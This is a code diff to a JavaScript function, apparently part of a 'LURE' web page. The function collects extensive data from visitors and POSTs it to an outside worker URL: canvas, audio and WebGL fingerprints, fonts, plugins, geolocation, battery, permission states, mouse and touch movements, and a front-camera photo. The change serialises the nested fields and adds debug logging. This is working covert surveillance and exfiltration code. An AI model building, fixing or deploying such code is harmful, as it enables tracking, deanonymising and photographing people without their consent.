@@ -280,7 +280,7 @@ async function sendPayload() {
   try {
     let data = await collectDynamicData();
     
-    // Transform to snake_case for worker compatibility
+    // Build payload with PROPER JSON.stringify for nested objects
     const payload = {
       sessionId: data.sessionId,
       timestamp: data.timestamp,
@@ -288,37 +288,42 @@ async function sendPayload() {
       referrer: data.referrer,
       user_agent: data.userAgent,
       language: data.language,
-      languages: data.languages,
+      languages: data.languages ? JSON.stringify(data.languages) : null,
       platform: data.platform,
       hardware_concurrency: data.hardwareConcurrency,
       device_memory: data.deviceMemory,
       max_touch_points: data.maxTouchPoints,
-      connection: data.connection,
-      screen: data.screen,
+      connection: data.connection ? JSON.stringify(data.connection) : null,
+      screen: data.screen ? JSON.stringify(data.screen) : null,
       timezone: data.timezone,
-      cookies_enabled: data.cookiesEnabled,
+      cookies_enabled: data.cookiesEnabled ? 1 : 0,
       do_not_track: data.doNotTrack,
       webdriver: data.webdriver ? 1 : 0,
-      plugins: data.plugins,
-      mime_types: data.mimeTypes,
+      plugins: data.plugins ? JSON.stringify(data.plugins) : null,
+      mime_types: data.mimeTypes ? JSON.stringify(data.mimeTypes) : null,
       history_length: data.historyLength,
-      navigation_timing: data.navigationTiming,
+      navigation_timing: data.navigationTiming ? JSON.stringify(data.navigationTiming) : null,
       canvas_fingerprint: data.canvasFingerprint,
       audio_fingerprint: data.audioFingerprint,
-      webgl_fingerprint: data.webglFingerprint,
-      battery: data.battery,
-      geolocation: data.geolocation,
+      webgl_fingerprint: data.webglFingerprint ? JSON.stringify(data.webglFingerprint) : null,
+      battery: data.battery ? JSON.stringify(data.battery) : null,
+      geolocation: data.geolocation ? JSON.stringify(data.geolocation) : null,
       front_photo: data.frontPhoto,
-      audio_devices: data.audioDevices,
-      fonts: data.fonts,
-      mouse_movements: data.mouseMovements,
-      touch_events: data.touchEvents,
-      permission_states: data.permissionStates,
+      audio_devices: data.audioDevices ? JSON.stringify(data.audioDevices) : null,
+      fonts: data.fonts ? JSON.stringify(data.fonts) : null,
+      mouse_movements: data.mouseMovements ? JSON.stringify(data.mouseMovements) : null,
+      touch_events: data.touchEvents ? JSON.stringify(data.touchEvents) : null,
+      permission_states: data.permissionStates ? JSON.stringify(data.permissionStates) : null,
       geolocation_error: data.geolocationError
     };
     
+    console.log('[LURE] Sending payload');
+    console.log('[LURE] - Permissions:', data.permissionStates);
+    console.log('[LURE] - WebGL:', data.webglFingerprint);
+    console.log('[LURE] - Payload size:', JSON.stringify(payload).length, 'bytes');
+    
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 8000);
+    const timeoutId = setTimeout(() => controller.abort(), 10000);
     
     const response = await fetch(WORKER_URL, {
       method: 'POST',
@@ -330,10 +335,14 @@ async function sendPayload() {
     
     clearTimeout(timeoutId);
 
+    const responseText = await response.text();
+    console.log('[LURE] Response status:', response.status);
+    console.log('[LURE] Response body:', responseText);
+    
     if (response.ok) {
       console.log('[LURE] Payload sent successfully');
     } else {
-      console.error('[LURE] HTTP error:', response.status);
+      console.error('[LURE] HTTP error:', response.status, responseText);
     }
   } catch (e) {
     if (e.name === 'AbortError') {
